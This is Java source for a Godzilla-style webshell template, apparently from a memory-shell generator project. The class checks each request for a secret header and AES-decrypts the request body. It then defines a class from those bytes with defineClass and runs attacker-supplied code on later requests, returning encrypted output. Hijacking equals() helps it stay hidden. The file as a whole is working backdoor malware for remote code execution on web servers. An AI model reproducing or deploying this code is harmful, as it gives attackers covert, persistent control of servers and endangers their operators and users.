package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * Godzilla HW Proxy 模板（JAVA_AES_RAW）。
 * <p>
 * 只包含当前加密器的协议，由 {@link GodzillaHwGenerator} 按配置选择；
 * 请求/响应统一通过反射访问，容器钩子只需传入 request/response。
 *
 * @author ReaJason
 */
public class GodzillaHwProxyRaw extends ClassLoader {
    private static String key;
    private static String headerName;
    private static String headerValue;
    private static Class<?> payload;


    public GodzillaHwProxyRaw() {
    }

    public GodzillaHwProxyRaw(ClassLoader parent) {
        super(parent);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = (Object[]) obj;
        Object request = unwrap(args[0], "request");
        Object response = unwrap(args[1], "response");
        try {
            return run(request, response);
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    public Object unwrap(Object obj, String fieldName) {
        try {
            return getFieldValue(obj, fieldName);
        } catch (Throwable e) {
            return obj;
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    private boolean run(Object request, Object response) throws Exception {
        String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
        if (value == null || !value.contains(headerValue)) {
            return false;
        }
        byte[] data = x(readBody(request), false);
        if (payload == null) {
            payload = this.defineClass(data, 0, data.length);
            return true;
        }
        java.io.OutputStream outputStream = (java.io.OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
        try {
            outputStream.write(x(execute(request, data), true));
        } catch (Throwable e) {
            e.printStackTrace();
        }
        outputStream.flush();
        outputStream.close();
        return true;
    }

    @SuppressWarnings("all")
    private static byte[] execute(Object request, byte[] data) throws Exception {
        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
        Object f = payload.newInstance();
        f.equals(arrOut);
        f.equals(request);
        f.equals(data);
        f.toString();
        return arrOut.toByteArray();
    }

    @SuppressWarnings("all")
    private static byte[] readBody(Object request) throws Exception {
        java.io.InputStream inputStream = (java.io.InputStream) request.getClass().getMethod("getInputStream").invoke(request);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int read;
        while ((read = inputStream.read(buffer)) > 0) {
            outputStream.write(buffer, 0, read);
        }
        return outputStream.toByteArray();
    }
    @SuppressWarnings("all")
    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return cipher.doFinal(s);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }

}
